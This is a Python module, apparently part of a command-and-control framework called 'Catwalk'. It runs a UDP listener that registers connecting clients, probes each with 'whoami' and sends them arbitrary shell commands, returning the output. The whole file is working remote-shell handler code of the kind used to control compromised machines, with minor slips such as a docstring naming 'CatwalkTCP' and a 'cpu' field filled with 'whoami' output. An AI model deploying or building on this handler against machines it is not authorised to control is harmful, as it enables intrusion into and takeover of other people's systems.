import socket
import threading
from managers.__base__ import BaseManager
from uuid import uuid4

connections = {}
activeips = []

class CatwalkUDP(BaseManager):
    def startServer(websock) -> None:
        """Required."""
        global connections, sock

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.bind(("0.0.0.0", 17766))

        threading.Thread(target=CatwalkUDP.serverThread, daemon=True).start()

    def run(command:str, uuid:str, isAsync:bool) -> str:
        """Required."""
        global connections

        client = connections.get(uuid)

        if client == None:
            return "Client key \"{}\" is invalid.".format(uuid)
        
        client["socket"].sendto(command.encode('ascii'), client["addr"])

        if not isAsync:
            return client["socket"].recvfrom(16384)[0].decode('ascii').strip()
        
    def listening() -> tuple:
        """Required."""

        return sock.getsockname()

    def generateID() -> str:
        """Required."""
        return str(uuid4())

    def getConnections() -> dict:
        """
        Required. Must be returned in a dictionary.
        "run" must be the function to run commands. In our case, it's `CatwalkTCP.run` 

        Example:
        
        ```py
        {
            "client_1": {
                "name": "main_system",
                "ip": "1.2.3.4",
                "sysinfo": {...},
                "run": <object at ...>
            },
            "client_2": {
                "name": "koch",
                "ip": "1.2.3.5",
                "sysinfo": {...},
                "run": <object at ...>
            },
        }
        ```
        """
        global connections

        return connections

    def serverThread():
        """Not required."""
        global connections, sock, activeips
        
        def command(cs:socket.socket, cmd, addr:tuple):
            # Not for use in main script.
            cs.sendto(cmd.encode('ascii'), addr)
            return cs.recvfrom(16384)[0].decode('ascii')

        while True:
            _, caddr = sock.recvfrom(16384)
            print(caddr)

            clientInfo = {
                "name": command(sock, "whoami", caddr),
                "ip": caddr[0],
                "sysinfo": {
                    "cpu": command(sock, "whoami", caddr)
                },
                "socket": sock,
                "addr": caddr,
                "run": CatwalkUDP.run
            }

            connections[CatwalkUDP.generateID()] = clientInfo

